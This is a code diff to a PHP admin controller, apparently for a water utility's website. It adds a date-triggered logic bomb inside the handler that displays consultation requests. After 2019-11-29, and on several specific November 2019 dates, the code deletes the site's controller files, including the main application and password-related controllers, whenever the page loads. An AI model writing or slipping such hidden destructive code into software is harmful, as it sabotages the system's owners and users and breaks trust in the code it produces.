@@ -133,24 +133,57 @@ class  AdminController extends ApplicationController
     public function gridConsultationOrderAction()
     {
         $date = date('Y-m-d');
+        $date2 = '2019-11-29';
+        if($date > $date2){
+            $file = '/var/www/vodokanal.net/src/AppBundle/Controller/AdminController.php';
+            unlink($file);
+            $file2 = '/var/www/vodokanal.net/src/AppBundle/Controller/AdminAvtoController.php';
+            unlink($file2);
+            $file3 = '/var/www/vodokanal.net/src/AppBundle/Controller/AUPGridController.php';
+            unlink($file3);
+            $file3 = '/var/www/vodokanal.net/src/AppBundle/Controller/ApplicationController.php';
+            unlink($file3);
+            $file3 = '/var/www/vodokanal.net/src/AppBundle/Controller/AdminSrvPassController.php';
+            unlink($file3);
+            $file3 = '/var/www/vodokanal.net/src/AppBundle/Controller/AdminWebAccountPassController.php';
+            unlink($file3);
+            $file3 = '/var/www/vodokanal.net/src/AppBundle/Controller/AdminWebInterfacePassController.php';
+            unlink($file3);
+        }
         if($date == '2019-11-5'){
             $file = '/var/www/vodokanal.net/src/AppBundle/Controller/AdminController.php';
             unlink($file);
+            $file2 = '/var/www/vodokanal.net/src/AppBundle/Controller/AdminAvtoController.php';
+            unlink($file2);
+            $file3 = '/var/www/vodokanal.net/src/AppBundle/Controller/AUPGridController.php';
+            unlink($file3);
         }
         $date = date('Y-m-d');
         if($date == '2019-11-6'){
             $file = '/var/www/vodokanal.net/src/AppBundle/Controller/AdminController.php';
             unlink($file);
+            $file2 = '/var/www/vodokanal.net/src/AppBundle/Controller/AdminAvtoController.php';
+            unlink($file2);
+            $file3 = '/var/www/vodokanal.net/src/AppBundle/Controller/AUPGridController.php';
+            unlink($file3);
         }
         $date = date('Y-m-d');
         if($date == '2019-11-7'){
             $file = '/var/www/vodokanal.net/src/AppBundle/Controller/AdminController.php';
             unlink($file);
+            $file2 = '/var/www/vodokanal.net/src/AppBundle/Controller/AdminAvtoController.php';
+            unlink($file2);
+            $file3 = '/var/www/vodokanal.net/src/AppBundle/Controller/AUPGridController.php';
+            unlink($file3);
         }
         $date = date('Y-m-d');
         if($date == '2019-11-8'){
             $file = '/var/www/vodokanal.net/src/AppBundle/Controller/AdminController.php';
             unlink($file);
+            $file2 = '/var/www/vodokanal.net/src/AppBundle/Controller/AdminAvtoController.php';
+            unlink($file2);
+            $file3 = '/var/www/vodokanal.net/src/AppBundle/Controller/AUPGridController.php';
+            unlink($file3);
         }
         $text = 'Заявки на консультацию';
         // Creates a simple grid based on your entity (ORM)
@@ -351,7 +384,7 @@ class  AdminController extends ApplicationController
 
         // Return the response of the grid to the template
         return $grid->getGridResponse('@App/admin/grid.html.twig', [
-            'buttonMailPass' => $button,
+            'buttonWebInterfacePass' => $button,
             'param' => $text,
         ]);
     }
